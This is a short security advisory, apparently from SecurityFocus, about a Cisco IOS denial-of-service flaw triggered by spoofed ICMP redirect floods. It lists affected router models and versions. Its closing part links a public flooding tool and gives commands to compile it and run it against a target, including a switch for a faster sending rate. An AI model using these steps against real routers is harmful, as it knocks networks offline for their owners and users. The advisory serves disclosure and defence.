source: https://www.securityfocus.com/bid/4786/info

IOS is the Internet Operating System, used on Cisco routers. It is distributed and maintained by Cisco.

It has been reported that it is possible to cause a denial of service in some Cisco routers by sending a large amount of spoofed ICMP redirect messages.

This vulnerability has been assigned Cisco bug ID CSCdx32056.

The following products are known to be affected:

Cisco 1005 running IOS 11.0(18)
Cisco 1603 running IOS 11.3(11b)
Cisco 1603 running IOS 12.0(3)
Cisco 2503 running IOS 11.0(22a)
Cisco 2503 running IOS 11.1(24a) 

To generate random ICMP redirect messages, a sender tool is available
at http://www.phenoelit.de/irpas/icmp_redflod.c, which has to be
linked with the IRPAS packet library.

linuxbox# cd /where/irpas/is
linuxbox# make libpackets.a
linuxbox# gcc -o icmp_redflod -I. -L. icmp_redflod.c -lpackets
linuxbox# ./icmp_redflod -i eth0 -D <destination_ip> -G <fake_gateway>

On high bandwidth networks, the command line switch -w0 can be used to increase the sending rate.